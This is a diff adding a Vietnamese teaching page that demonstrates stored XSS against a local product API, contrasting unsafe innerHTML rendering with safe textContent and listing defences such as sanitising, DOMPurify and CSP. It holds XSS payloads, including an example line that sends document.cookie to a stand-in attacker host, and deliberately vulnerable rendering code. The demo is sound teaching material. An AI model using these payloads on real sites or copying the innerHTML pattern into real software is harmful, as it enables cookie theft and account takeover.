@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stored XSS Demo</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 { color: #e74c3c; }
+        h2 { color: #333; margin-top: 0; }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .danger {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        .safe {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover { background: #2980b9; }
+        button.danger-btn { background: #e74c3c; }
+        button.danger-btn:hover { background: #c0392b; }
+        .product-list {
+            display: grid;
+            gap: 15px;
+        }
+        .product-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #dee2e6;
+        }
+        .product-name {
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 5px;
+        }
+        code {
+            background: #e9ecef;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 13px;
+        }
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+        }
+        #products-unsafe, #products-safe {
+            min-height: 100px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔓 Stored XSS Demo</h1>
+
+    <div class="warning">
+        <strong>⚠️ Cảnh báo:</strong> Demo này chỉ dùng cho mục đích học tập trên hệ thống của bạn.
+    </div>
+
+    <div class="card">
+        <h2>Stored XSS là gì?</h2>
+        <p>Stored XSS xảy ra khi:</p>
+        <ol>
+            <li><strong>Attacker</strong> gửi dữ liệu chứa mã JavaScript độc hại</li>
+            <li><strong>Server</strong> lưu dữ liệu vào database mà không sanitize</li>
+            <li><strong>Victim</strong> (admin/user) xem trang có dữ liệu đó</li>
+            <li><strong>Browser</strong> của victim chạy JavaScript độc hại</li>
+        </ol>
+        <pre>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)"&gt;</pre>
+    </div>
+
+    <div class="card">
+        <h2>Bước 1: Tạo sản phẩm với XSS payload</h2>
+        <p>Nhấn nút để tạo sản phẩm có chứa mã XSS:</p>
+        <button onclick="createXSSProduct()" class="danger-btn">🔴 Tạo sản phẩm XSS</button>
+        <button onclick="createNormalProduct()">🟢 Tạo sản phẩm bình thường</button>
+        <div id="create-result" style="margin-top: 15px;"></div>
+    </div>
+
+    <div class="card">
+        <h2>Bước 2: Hiển thị KHÔNG AN TOÀN (innerHTML)</h2>
+        <p>Code: <code>element.innerHTML = product.name</code></p>
+        <div class="danger">
+            <strong>⚠️ NGUY HIỂM:</strong> Nếu thấy alert popup, XSS đã thành công!
+        </div>
+        <button onclick="loadProductsUnsafe()">Load Products (UNSAFE)</button>
+        <div id="products-unsafe" class="product-list" style="margin-top: 15px;"></div>
+    </div>
+
+    <div class="card">
+        <h2>Bước 3: Hiển thị AN TOÀN (textContent)</h2>
+        <p>Code: <code>element.textContent = product.name</code></p>
+        <div class="safe">
+            <strong>✅ AN TOÀN:</strong> Script sẽ hiện như text, không chạy
+        </div>
+        <button onclick="loadProductsSafe()">Load Products (SAFE)</button>
+        <div id="products-safe" class="product-list" style="margin-top: 15px;"></div>
+    </div>
+
+    <div class="card">
+        <h2>Cách phòng chống XSS</h2>
+        <table style="width: 100%; border-collapse: collapse;">
+            <tr style="background: #f8f9fa;">
+                <th style="padding: 10px; text-align: left; border-bottom: 2px solid #dee2e6;">Vị trí</th>
+                <th style="padding: 10px; text-align: left; border-bottom: 2px solid #dee2e6;">Giải pháp</th>
+            </tr>
+            <tr>
+                <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>Backend</strong></td>
+                <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">Sanitize input trước khi lưu DB (strip HTML tags)</td>
+            </tr>
+            <tr>
+                <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>Frontend</strong></td>
+                <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">Dùng <code>textContent</code> thay <code>innerHTML</code>, hoặc dùng DOMPurify</td>
+            </tr>
+            <tr>
+                <td style="padding: 10px; border-bottom: 1px solid #dee2e6;"><strong>React</strong></td>
+                <td style="padding: 10px; border-bottom: 1px solid #dee2e6;">React tự động escape, tránh <code>dangerouslySetInnerHTML</code></td>
+            </tr>
+            <tr>
+                <td style="padding: 10px;"><strong>Headers</strong></td>
+                <td style="padding: 10px;">Content-Security-Policy (CSP) header</td>
+            </tr>
+        </table>
+    </div>
+
+    <script>
+        const API_URL = 'http://localhost:3001/api';
+
+        // Tạo sản phẩm với XSS payload
+        async function createXSSProduct() {
+            const resultDiv = document.getElementById('create-result');
+            resultDiv.innerHTML = 'Đang tạo...';
+
+            try {
+                const response = await fetch(`${API_URL}/products`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        name: '<img src=x onerror="alert(\'XSS Attack! Cookie: \' + document.cookie)">Sản phẩm độc hại',
+                        basePrice: 999,
+                        status: 'active'
+                    })
+                });
+                const data = await response.json();
+                resultDiv.innerHTML = `
+                    <div class="danger">
+                        <strong>✓ Đã tạo sản phẩm XSS!</strong><br>
+                        ID: ${data.data.id}<br>
+                        Name (raw): <code>${escapeHtml(data.data.name)}</code>
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="danger">Lỗi: ${error.message}</div>`;
+            }
+        }
+
+        // Tạo sản phẩm bình thường
+        async function createNormalProduct() {
+            const resultDiv = document.getElementById('create-result');
+            resultDiv.innerHTML = 'Đang tạo...';
+
+            try {
+                const response = await fetch(`${API_URL}/products`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        name: 'Sản phẩm bình thường ' + Date.now(),
+                        basePrice: 100,
+                        status: 'active'
+                    })
+                });
+                const data = await response.json();
+                resultDiv.innerHTML = `
+                    <div class="safe">
+                        <strong>✓ Đã tạo sản phẩm!</strong><br>
+                        ID: ${data.data.id}<br>
+                        Name: ${data.data.name}
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="danger">Lỗi: ${error.message}</div>`;
+            }
+        }
+
+        // Load products KHÔNG AN TOÀN (sẽ trigger XSS)
+        async function loadProductsUnsafe() {
+            const container = document.getElementById('products-unsafe');
+            container.innerHTML = 'Đang load...';
+
+            try {
+                const response = await fetch(`${API_URL}/products?limit=5`);
+                const data = await response.json();
+
+                container.innerHTML = '';
+                data.data.forEach(product => {
+                    const div = document.createElement('div');
+                    div.className = 'product-item';
+                    // ⚠️ KHÔNG AN TOÀN - innerHTML sẽ execute script/event handlers
+                    div.innerHTML = `
+                        <div class="product-name">${product.name}</div>
+                        <div>Giá: ${Number(product.basePrice).toLocaleString()}đ</div>
+                    `;
+                    container.appendChild(div);
+                });
+            } catch (error) {
+                container.innerHTML = `<div class="danger">Lỗi: ${error.message}</div>`;
+            }
+        }
+
+        // Load products AN TOÀN
+        async function loadProductsSafe() {
+            const container = document.getElementById('products-safe');
+            container.innerHTML = 'Đang load...';
+
+            try {
+                const response = await fetch(`${API_URL}/products?limit=5`);
+                const data = await response.json();
+
+                container.innerHTML = '';
+                data.data.forEach(product => {
+                    const div = document.createElement('div');
+                    div.className = 'product-item';
+
+                    const nameDiv = document.createElement('div');
+                    nameDiv.className = 'product-name';
+                    // ✅ AN TOÀN - textContent escapes HTML
+                    nameDiv.textContent = product.name;
+
+                    const priceDiv = document.createElement('div');
+                    priceDiv.textContent = `Giá: ${Number(product.basePrice).toLocaleString()}đ`;
+
+                    div.appendChild(nameDiv);
+                    div.appendChild(priceDiv);
+                    container.appendChild(div);
+                });
+            } catch (error) {
+                container.innerHTML = `<div class="danger">Lỗi: ${error.message}</div>`;
+            }
+        }
+
+        // Helper function để escape HTML cho display
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+    </script>
+</body>
+</html>
